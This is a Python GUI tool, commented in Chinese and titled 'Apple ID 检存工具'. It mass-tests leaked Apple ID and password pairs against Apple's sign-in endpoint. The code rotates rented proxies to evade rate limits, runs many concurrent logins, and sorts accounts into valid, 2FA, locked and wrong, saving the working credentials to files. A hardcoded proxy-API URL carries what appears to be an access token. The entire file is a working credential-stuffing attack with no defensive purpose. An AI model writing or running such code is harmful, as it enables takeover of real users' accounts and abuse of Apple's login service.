import threading
import asyncio
import aiohttp
import PySimpleGUI as sg
import os
from datetime import datetime
import logging
import colorlog
import json

# Configure logging
# 设置基础配置（这将影响所有没有特别配置的logger）
logging.basicConfig(level=logging.INFO)
# 创建logger
logger = logging.getLogger(__name__)
# 创建文件处理器，指定日志文件的名称和写入模式
file_handler = logging.FileHandler('my_log_file.log', mode='a')
# 设置文件日志格式
file_formatter = logging.Formatter(
    '%(asctime)s - %(threadName)s - %(name)s - %(levelname)s - %(message)s')
file_handler.setFormatter(file_formatter)
# 将文件处理器添加到logger
logger.addHandler(file_handler)

# 创建控制台处理器
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
# 设置控制台日志颜色格式
console_formatter = colorlog.ColoredFormatter(
    "%(log_color)s%(asctime)s - %(threadName)s - %(name)s - %(levelname)s - %(message)s",
    datefmt=None,
    reset=True,
    log_colors={
        'DEBUG':    'cyan',
        'INFO':     'green',
        'WARNING':  'yellow',
        'ERROR':    'red',
        'CRITICAL': 'red,bg_white'
    },
    secondary_log_colors={},
    style='%'
)
console_handler.setFormatter(console_formatter)
# 将控制台处理器添加到logger
logger.addHandler(console_handler)


# 创建统计数据类
# 使用asyncio.Lock来确保在异步环境中对统计数据的访问和修改是线程安全的。
class Statistics:
    def __init__(self):
        self.data = {"total": 0, "correct": 0,
                     "2fa": 0, "locked": 0, "error": 0}
        self.processed_accounts = 0
        self.lock = asyncio.Lock()

    async def update(self, key, value):
        async with self.lock:
            if key in self.data:
                self.data[key] += value
                self.processed_accounts += 1
            # logger.info(f"Updated {key}: {self.data[key]}")

    async def increment_processed_accounts(self):
        async with self.lock:
            # self.processed_accounts += 1
            self.processed_accounts = self.data["correct"] + self.data["2fa"] + self.data["locked"] + self.data["error"]

    async def get_stats(self):
        async with self.lock:
            return self.data.copy(), self.processed_accounts

    async def set_total(self, value):
        async with self.lock:
            self.data["total"] = value


# 创建结果文件夹和文件
folder_name = datetime.now().strftime("%Y%m%d%H%M%S")
os.makedirs(f'results/{folder_name}', exist_ok=True)
logger.info(f"创建结果文件夹: {folder_name}")


# 更新GUI界面
async def update_gui(window, stats):
    global is_running
    while True:
        await asyncio.sleep(2)    # 每隔0.5秒更新一次
        if is_running:
            try:
                current_stats, processed_accounts = await stats.get_stats()
                for key, value in current_stats.items():
                    window[f"-{key.upper()}-"].update(value)

                # 更新进度条
                total_accounts = int(window['-TOTAL-'].get())
                if total_accounts > 0:  # 避免除以零
                    progress = (processed_accounts / total_accounts) * 100
                    window['progress'].update_bar(progress, 100)
            except Exception as e:
                logger.error(f"Failed to update GUI: {e}")
                break

# 定义窗口的内容和布局
row1 = [sg.Text("总数", size=(8, 1)),
        sg.Text("正确", size=(6, 1)),
        sg.Text("双重", size=(8, 1)),
        sg.Text("被锁", size=(6, 1)),
        sg.Text("错误", size=(8, 1))]
row2 = [sg.Text("-", size=(8, 1), key="-TOTAL-"),
        sg.Text("-", size=(8, 1), key="-CORRECT-"),
        sg.Text("-", size=(8, 1), key="-2FA-"),
        sg.Text("-", size=(8, 1), key="-LOCKED-"),
        sg.Text("-", size=(8, 1), key="-ERROR-")]
row3 = [[sg.Text("输入文件：", size=(8, 1)), sg.InputText(key="-APPLEIDFILE-", size=(25, 1)),
         sg.FileBrowse(button_text="选择文件", file_types=(("文本文件", "*.txt"),))],
        [sg.Text("代理接口：", size=(8, 1)), sg.Input(
            key='-PROXYURL-', size=(35, 1))],
        [sg.Text("线程数量：", size=(8, 1)), sg.Input(
            key='-THREAD-', size=(35, 1))],
        [sg.Text("检测进度：", size=(8, 1)), sg.ProgressBar(1, orientation='h', size=(
            25, 15), key='progress', bar_color=('green', 'white'))]]
row4 = [sg.Text("未启动", key="-MESSAGES-", size=(45, 1), justification='center', text_color='blue')]
row5 = [sg.Button('Start'), sg.Button('Stop')]

# 定义窗口的布局
layout = [[sg.Column([
    [sg.Frame('检测结果：', [row1, row2])],
    [sg.Frame('检测设置：', row3)],
    [sg.Frame('运行状态：', [row4])],
    [sg.Frame('检测控制：', [row5])]
])]]

# 创建窗口
window = sg.Window('Apple ID 检存工具', layout, finalize=True, ttk_theme='alt')

# 在窗口创建后启动GUI更新线程
stats = Statistics()


def run_async(coroutine, window):
    """
    在单独的线程中运行异步任务，并在完成时通知GUI。
    """
    def thread_func():
        try:
            new_loop = asyncio.new_event_loop()
            asyncio.set_event_loop(new_loop)
            future = asyncio.run_coroutine_threadsafe(coroutine, new_loop)
            future.add_done_callback(lambda f: window.write_event_value('-TASK_COMPLETED-', None))
            new_loop.run_forever()
        except Exception as e:
            logger.error(f"Error in thread_func: {e}")

    threading.Thread(target=thread_func, daemon=True).start()


def run_async_gui(coroutine, window):
    """
    在单独的线程中运行异步任务，并在完成时通知GUI。
    """
    def thread_func():
        try:
            new_loop = asyncio.new_event_loop()
            asyncio.set_event_loop(new_loop)
            asyncio.run_coroutine_threadsafe(coroutine, new_loop)
            # future.add_done_callback(lambda f: window.write_event_value('-TASK_COMPLETED-', None))
            new_loop.run_forever()
        except Exception as e:
            logger.error(f"Error in thread_func: {e}")

    threading.Thread(target=thread_func, daemon=True).start()


# 启动 GUI 更新线程
run_async_gui(update_gui(window, stats), window)


# 创建文件写入函数
def write_to_correct_file(apple_id, password):
    with open(f'results/{folder_name}/密正.txt', 'a') as file:
        file.write(f"{apple_id}----{password}\n")


def write_to_two_factor_file(apple_id, password):
    with open(f'results/{folder_name}/双重.txt', 'a') as file:
        file.write(f"{apple_id}----{password}\n")


def write_to_locked_file(apple_id, password):
    with open(f'results/{folder_name}/被锁.txt', 'a') as file:
        file.write(f"{apple_id}----{password}\n")


def write_to_error_file(apple_id, password):
    with open(f'results/{folder_name}/错误.txt', 'a') as file:
        file.write(f"{apple_id}----{password}\n")

# 代理IP池
class ProxyPool:
    def __init__(self, api_url, num_proxies_to_fetch):
        print("实例化ProxyPool类...")
        self.api_url = api_url
        self.num_proxies_to_fetch = num_proxies_to_fetch
        self.proxy_queue = asyncio.Queue()
        self.lock = asyncio.Lock()
        self.stop_event = asyncio.Event()

    async def replenish_proxies(self):
        while not self.stop_event.is_set():
            async with self.lock:
                if self.proxy_queue.qsize() < self.num_proxies_to_fetch:
                    async with aiohttp.ClientSession() as session:
                        try:
                            async with session.get(self.api_url) as response:
                                proxies = await response.text()
                                for proxy in proxies.strip().split('\n'):
                                    await self.proxy_queue.put(proxy.strip())
                        except Exception as e:
                            logger.error(f"Failed to fetch proxies: {e}")
            await asyncio.sleep(1)  # 等待一段时间再次检查

    async def get_proxy(self):
        return await self.proxy_queue.get()

    async def start(self):
        # 启动补充代理的协程
        asyncio.create_task(self.replenish_proxies())

    async def stop(self):
        self.stop_event.set()  # 通知补充操作停止
        # 可以在这里添加额外的逻辑，例如等待当前补充操作完成


# 帐号密码对池
class AccountPool:
    def __init__(self, stats):
        print("实例化AccountPool类...")
        self.account_queue = asyncio.Queue()
        self.processed_accounts = set()  # 使用集合来确保不会重复
        self.stats = stats
        self.retry_counts = {}      # 用于记录帐号重试次数

    async def load_accounts(self, file_path):
        account_count = 0
        unique_accounts = set()  # 用于存储已加载的唯一账号密码对

        try:
            with open(file_path, 'r') as file:
                for line in file:
                    apple_id, password = line.strip().split('----')
                    account_pair = (apple_id, password)  # 创建一个元组来表示账号密码对

                    # 检查账号密码对是否已存在
                    if account_pair not in unique_accounts:
                        unique_accounts.add(account_pair)  # 添加新的账号密码对
                        await self.account_queue.put(account_pair)
                        account_count += 1
                        logger.info(f"Account added to queue: {apple_id}")
                    else:
                        logger.info(f"Duplicate account skipped: {apple_id}")

            await self.stats.set_total(account_count)
        except Exception as e:
            logger.error(f"Error loading accounts: {e}")

    async def get_account(self):
        return await self.account_queue.get() if not self.account_queue.empty() else None

    # 用于在重新加入队列之前增加帐号的重试次数
    def increment_retry_count(self, apple_id):
        """增加帐号的重试次数，并返回新的重试次数"""
        if apple_id in self.retry_counts:
            self.retry_counts[apple_id] += 1
            if self.retry_counts[apple_id] >= 10:
                self.processed_accounts.add(apple_id)
        else:
            self.retry_counts[apple_id] = 1
        logger.warning(f"帐号 {apple_id} 重试次数: {self.retry_counts[apple_id]}")
        return self.retry_counts[apple_id]


# 定义共享状态标志
stop_event = asyncio.Event()


# Apple ID 检测器, 使用代理池和帐号密码对池, 以及共享的统计数据
class AsyncAppleIDChecker:
    def __init__(self, proxy_pool, account_pool, stats):
        self.URL = 'https://idmsa.apple.com/appleauth/auth/signin'
        self.HEADERS = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "X-Apple-Locale": "QT-EN",
            "X-Apple-Trusted-Domain": "https://idmsa.apple.com",
            "Origin": "https://idmsa.apple.com",
            "X-Requested-With": "XMLHttpRequest"
        }
        self.proxy_pool = proxy_pool
        self.account_pool = account_pool
        self.stats = stats
        self.session = None

    async def check_account(self):
        # 确保每次使用 session 时都在当前的异步事件循环中创建
        if not self.session:
            self.session = aiohttp.ClientSession(headers=self.HEADERS)
        while not stop_event.is_set():
            account = await self.account_pool.get_account()

            if account is None:
                break  # 如果队列为空，则退出循环
            apple_id, password = account

            proxy_ip = await self.proxy_pool.get_proxy()
            proxy = f"http://{proxy_ip}"

            try:
                async with self.session.post(self.URL, json={"accountName": apple_id, "password": password, "rememberMe": False}, proxy=proxy) as response:
                    response_text = await response.text()
                    # logger.info(f"响应内容: {response_text}")
                    # self.account_pool.mark_account_processed(apple_id)      # 标记帐号已经处理过
                    return await self.process_response(apple_id, password, response_text)
            except Exception as e:
                logger.error(f"其他错误: {e}")
                # 错误处理: 重新加入队列并更换代理
                # 如果帐号没有超过最大重试次数，重新加入队列
                if self.account_pool.increment_retry_count(apple_id) <= 10:
                    await self.account_pool.account_queue.put(account)
                    logger.warning(f"重新加入队列: {account}")

            await asyncio.sleep(0.2)  # 短暂等待后重试

            account = self.account_pool.get_account()
            # 定期检查是否应该停止
            if stop_event.is_set():
                break

    async def process_response(self, apple_id, password, response_text):
        # global stats
        try:
            response_json = json.loads(response_text)

            if response_json.get('authType') in ["non-sa", "restricted"]:
                await self.stats.update("correct", 1)
                logger.info(
                    f'密码正确 NO 2FA AppleID -> {apple_id}:{password}')
                write_to_correct_file(apple_id, password)
                return {"status": "密码正确", "message": "帐号密码正确，无需双重认证。"}
            elif response_json.get('authType') in ["sa", "hsa2", "hsa", "2sa", "2sa2"]:
                await self.stats.update("2fa", 1)
                logger.info(
                    f'双重认证 2FA AppleID -> {apple_id}:{password}')
                write_to_two_factor_file(apple_id, password)
                return {"status": "双重认证", "message": "帐号密码正确，但开启了双重认证。"}
            elif response_json["serviceErrors"][0].get("code") in ["-20209"]:
                await self.stats.update("locked", 1)
                # write_to_locked_file(apple_id, password)
                logger.info(
                    f'安全原因帐号被锁 AppleID -> {apple_id}:{password}')
                return {"status": "帐号被锁", "message": "此Apple ID因安全原因已被锁定。"}
            elif response_json["serviceErrors"][0].get("code") in ["-20101", "-20751"]:
                await self.stats.update("error", 1)
                # write_to_error_file(apple_id, password)
                logger.info(
                    f'密码错误 AppleID -> {apple_id}:{password}')
                return {"status": "密码错误", "message": "帐号或密码错误。"}
            else:
                await self.stats.update("error", 1)
                # write_to_error_file(apple_id, password)
                logger.error(
                    f'错误 AppleID -> {apple_id}:{password}|{response_text}')
                return {"status": "未知错误", "message": "出现未知错误或其他异常情况。"}
        except Exception as e:
            logger.error(f"处理响应时发生未知错误：{e}")
            await self.stats.update("error", 1)
            # write_to_error_file(apple_id, password)
            return {"status": "未知错误", "message": "处理响应时发生未知错误。"}

    async def close(self):
        if self.session:
            await self.session.close()


# 使用示例
async def main(appleid_file_path, proxy_api_url, concurrency, NUM_PROXIES_TO_FETCH=2000):
    proxy_pool = ProxyPool(proxy_api_url, NUM_PROXIES_TO_FETCH)
    await proxy_pool.start()  # 异步启动代理池
    account_pool = AccountPool(stats)
    await account_pool.load_accounts(appleid_file_path)     # 异步加载帐号密码对
    checker = AsyncAppleIDChecker(proxy_pool, account_pool, stats)

    # 启动检测器
    count_sleep_time = 0
    while not stop_event.is_set():
        if not account_pool.account_queue.empty():
            tasks = [asyncio.create_task(checker.check_account())
                        for _ in range(min(concurrency, account_pool.account_queue.qsize()))]
            await asyncio.gather(*tasks)
        else:
            count_sleep_time += 1
            await asyncio.sleep(1)  # 短暂等待，避免密集循环
            if count_sleep_time > 2:
                break
        logger.info(f"队列中的数据数量：{account_pool.account_queue.qsize()}")
        logger.info(f"stats: {stats.data}")

    await checker.close()
    await proxy_pool.stop()  # 确保实现了ProxyPool的停止逻辑

# 定义标志变量
is_running = False

# 事件循环
while True:
    event, values = window.read(timeout=100)  # 设置一个适当的超时时间

    if event == sg.WINDOW_CLOSED:
        break
    elif event == 'Start' and not is_running:
        # 禁用“Start”按钮
        window['Start'].update(disabled=True)
        # 获取GUI输入值
        DEFAULT_PROXY_API_URL = 'http://api.haiwaidaili.net/abroad?token=b6737956f41a979f6ac2e2a5e2da865e&num=1000&format=1&protocol=http&country=gb&state=bfc&city=Nuits-Saint-Georges&sep=3&csep=&type=datacenter&area=HK'
        # DEFAULT_PROXY_API_URL = 'https://api.hailiangip.com:8522/api/getIpEncrypt?dataType=1&encryptParam=9f9A9DgV7OXgVxE3tqtmm8xrfzbHJWGb6%2FsQJ3YVrT3d%2BQOCcqHCgKqSl1O5XD25m6NgLw7BOxdDgstMXKs5%2FJsDVtrOK9464RkeO2C4YbYCX362oMgZ0Y7Hi%2FmMpF%2FpJi00swVBCOra6hzpaLcciBM7GUr4AlVnA8ao%2BezhC5vfRWzM2F7Ltps73nfwTJGizgNJSea6RpFr0zTvuEvjJfqcwqDOVb1YxPNf7KXEs5g%3D'
        appleid_file_path = values["-APPLEIDFILE-"]
        proxy_api_url = values["-PROXYURL-"] if values["-PROXYURL-"] else DEFAULT_PROXY_API_URL
        concurrency_input = values["-THREAD-"]
        concurrency = int(concurrency_input) if concurrency_input.isdigit() else 100
        # if concurrency > 300:
        #     concurrency = 300
        logger.info(f"选择的文件路径是: {appleid_file_path}")
        logger.info(f"代理接口是: {proxy_api_url}")
        logger.info(f"线程数量是: {concurrency}")

        if not os.path.exists(appleid_file_path) or not os.path.isfile(appleid_file_path) or not appleid_file_path.endswith('.txt') or not appleid_file_path:
            window['-MESSAGES-'].update("文件不存在，或者文件后缀不是txt，请重新选择文件")
            window['Start'].update(disabled=False)
            continue
        # 标记任务集正在运行
        is_running = True
        window['-MESSAGES-'].update(f"正在检测...检测结果实时保存到 {folder_name} 目录中")

        # 在单独的线程中运行异步任务
        # 创建并启动异步任务
        coroutine = main(appleid_file_path, proxy_api_url, concurrency)
        run_async(coroutine, window)

    elif event == '-TASK_COMPLETED-':
        # 任务完成，更新is_running标志
        is_running = False
        window['progress'].update_bar(100, 100)
        window.refresh()
        window['-MESSAGES-'].update(f"检测完成! 检测结果在 {folder_name} 目录中")

        # 重新启用“Start”按钮
        window['Start'].update(disabled=False)

        stop_event.clear()  # 重置停止事件, 以便下次运行时可以正常工作
    elif event == 'Stop' or event == '-ON_FILE_INPUT-':
        window['-MESSAGES-'].update("正在停止...")
        logger.info("点击Stop按钮，停止检测...")
        stop_event.set()  # 设置停止事件, 以便异步任务可以正常退出
        window['Start'].update(disabled=False)  # 重新启用“Start”按钮
        window['-MESSAGES-'].update("已停止检测")


# 关闭
window.close()